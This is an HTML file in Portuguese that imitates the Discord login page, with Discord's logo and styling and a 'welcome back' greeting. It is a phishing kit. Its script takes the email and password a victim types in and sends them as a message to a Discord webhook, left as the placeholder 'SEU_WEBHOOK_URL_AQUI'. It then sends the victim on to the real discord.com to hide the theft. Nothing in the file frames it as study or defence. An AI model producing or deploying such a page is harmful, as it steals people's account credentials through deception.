<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #404EED;
            color: white;
            margin: 0;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        .login-container {
            background: #2F3136;
            padding: 20px;
            border-radius: 8px;
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-bottom: 10px;
        }
        p {
            color: #b9bbbe;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background: #1E1F22;
            color: white;
        }
        input::placeholder {
            color: #b9bbbe;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #5865F2;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/en/6/60/Discord_logo_2015.svg" alt="Discord Logo" class="logo">
    <div class="login-container">
        <h2>Boas-vindas de volta!</h2>
        <p>Estamos muito animados em te ver novamente!</p>
        <form id="loginForm">
            <input type="email" id="email" placeholder="E-MAIL OU NÃšMERO DE TELEFONE *" required>
            <input type="password" id="password" placeholder="SENHA *" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            
            // Enviar os dados para um Webhook do Discord
            fetch("SEU_WEBHOOK_URL_AQUI", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: `Novo login:\nEmail: ${email}\nSenha: ${password}`
                })
            }).then(() => {
                window.location.href = "https://discord.com";
            });
        });
    </script>
</body>
</html>
